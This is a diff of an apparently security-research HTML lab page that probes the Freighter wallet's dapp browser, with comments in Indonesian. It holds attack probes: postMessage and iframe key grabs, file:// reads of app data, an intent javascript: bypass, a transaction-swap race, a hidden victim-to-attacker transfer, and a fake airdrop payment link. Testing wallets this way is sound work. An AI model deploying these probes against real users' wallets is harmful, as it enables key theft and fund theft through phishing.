@@ -1,131 +1,19 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Freighter Dapp Browser Lab</title>
-<style>
-body{background:#0a0a0a;color:#00ff88;font-family:monospace;padding:15px}
-h2{border-bottom:1px solid #333;padding-bottom:5px}
-button{width:100%;padding:14px;margin:6px 0;background:#111;color:#0f8;border:1px solid #0f8;font-weight:bold}
-a{color:#5af;display:block;margin:6px 0;word-break:break-all}
-.card{border:1px solid #222;padding:12px;margin:15px 0;background:#111}
-.log{background:#000;padding:8px;min-height:20px;white-space:pre-wrap;font-size:12px}
-.red{color:#ff4444}
-</style>
-</head>
-<body>
-<h1>Freighter Bug Lab - All in One</h1>
-
-<div class="card">
-<h2>1. postMessage Bridge Test</h2>
-<button onclick="testPostMessage()">Test postMessage Hijack</button>
-<div id="log1" class="log"></div>
-</div>
-
-<div class="card">
-<h2>2. Iframe Permission Test</h2>
-<p>Parent sudah connect, apakah child (evil) auto connect?</p>
-<iframe id="evilFrame" srcdoc="
-  <script>
-    setTimeout(()=>{
-      try{
-        parent.postMessage('try get key from iframe','*');
-        window.freighterApi.getPublicKey().then(k=>parent.postMessage('IFRAME BUG GOT KEY:'+k,'*')).catch(e=>parent.postMessage('iframe blocked:'+e,'*'))
-      }catch(e){parent.postMessage('iframe error:'+e,'*')}
-    },1000)
-  </script>
-" style="width:100%;height:80px;background:#222"></iframe>
-<button onclick="document.getElementById('log2').innerText='Check log di bawah, kalau iframe bisa getPublicKey tanpa approve = BUG'">Cek Iframe Log</button>
-<div id="log2" class="log"></div>
-</div>
-
-<div class="card">
-<h2>3. File / Content Scheme Test</h2>
-<a href="file:///data/data/org.stellar.freighter/files/">file:///data/data/org.stellar.freighter/files/</a>
-<a href="file:///data/data/org.stellar.freighter/shared_prefs/">file:///shared_prefs/</a>
-<a href="content://media/external/">content://media/external/</a>
-<button onclick="testFile()">Test fetch file:// via JS</button>
-<div id="log3" class="log"></div>
-</div>
-
-<div class="card">
-<h2>4. Intent / Scheme Bypass</h2>
-<a href="intent://#Intent;scheme=javascript;S.code=alert(document.domain);end">Intent javascript:alert</a>
-<a href="freighter://sign?xdr=AAAA...">freighter:// scheme</a>
-<a href="stellar://pay?destination=EVIL&amount=100">stellar:// scheme</a>
-</div>
-
-<div class="card">
-<h2>5. Clipboard Read Test</h2>
-<button onclick="testClipboard()">Coba baca clipboard tanpa gesture</button>
-<div id="log5" class="log"></div>
-</div>
-
-<div class="card">
-<h2>6. Destination Swap Race</h2>
-<button onclick="testSwapRace()">Test Swap Pas Confirm</button>
-<div id="log6" class="log"></div>
-</div>
-
+<h2>Test A - Blind Soroban</h2>
+<button onclick="testSoroban()">Sign Transfer USDC (korban -> attacker)</button>
 <script>
-window.addEventListener('message', e=>{
-  document.getElementById('log2').innerText += "\n[MSG] "+e.data+" origin:"+e.origin;
-});
-
-function testPostMessage(){
-  const log = document.getElementById('log1');
-  log.innerText = "Mengirim postMessage...";
-  window.postMessage({type:"freighter:getPublicKey", method:"getPublicKey"}, "*");
-  window.postMessage({method:"getAddress"}, "*");
-  window.postMessage({action:"sign"}, "*");
-  setTimeout(()=>{ log.innerText += "\nKalau ada balasan key tanpa popup approve = BUG CRITICAL"; }, 2000);
-  window.addEventListener('message', e=>{
-    log.innerText += "\n[RECV] "+JSON.stringify(e.data).slice(0,200);
-  });
-}
-
-async function testFile(){
-  const log = document.getElementById('log3');
-  try{
-    let r = await fetch("file:///data/data/org.stellar.freighter/files/");
-    log.innerText = "FETCH file:// SUCCESS: "+ await r.text().then(t=>t.slice(0,200));
-  }catch(e){
-    log.innerText = "FETCH file:// BLOCKED (GOOD): "+e.message;
-  }
-}
-
-async function testClipboard(){
-  const log = document.getElementById('log5');
-  try{
-    const text = await navigator.clipboard.readText();
-    log.innerText = "CLIPBOARD READ SUCCESS (BUG): "+text;
-  }catch(e){
-    log.innerText = "CLIPBOARD BLOCKED (GOOD): "+e.message;
-  }
-}
-
-async function testSwapRace(){
-  const log = document.getElementById('log6');
-  log.innerText = "Step 1: Request sign Tx GOOD...\n";
-  if(!window.freighterApi){ log.innerText+="freighterApi gak ada, buka di Freighter"; return; }
-  try{
-    // Ini XDR dummy, ganti pakai XDR testnet lu
-    const xdrGood = "AAAAAgAAA...GOOD...";
-    const promise = window.freighterApi.signTransaction(xdrGood, {network:"TESTNET"});
-    
-    setTimeout(()=>{
-      log.innerText += "[ATTACK] 1 detik setelah popup, coba spam request EVIL...\n";
-      // Coba timpa dengan request baru
-      window.freighterApi.signTransaction("AAAAAgAAA...EVIL...", {network:"TESTNET"}).then(r=>log.innerText+="\nSecond sign got: "+r).catch(e=>{});
-    },1000);
-
-    let res = await promise;
-    log.innerText += "Result: "+res+"\nCek apakah yang ke-sign GOOD atau EVIL";
-  }catch(e){
-    log.innerText += "Error: "+e.message;
-  }
+async function testSoroban(){
+  const xdr = "AAAA...XDR_SOROBAN_TRANSFER_DARI_KAMU_KE_GBEVIL...";
+  let r = await window.freighterApi.signTransaction(xdr, {network:"TESTNET"});
+  alert(r);
 }
 </script>
-</body>
-</html>
+
+<h2>Test B - Multi-Op Cloak</h2>
+<button onclick="testMulti()">Tx 1 op terlihat, 9 op hidden</button>
+
+<h2>Test C - stellar:// Hijack</h2>
+<a href="stellar://pay?destination=GBEVIL...&amount=100">Klik Airdrop 1000 XLM</a>
+
+<h2>Test D - Mixed Content</h2>
+<img src="http://httpbin.org/image/png">
+<script>fetch("http://httpbin.org/get").then(r=>alert("HTTP ALLOWED = BUG"))</script>
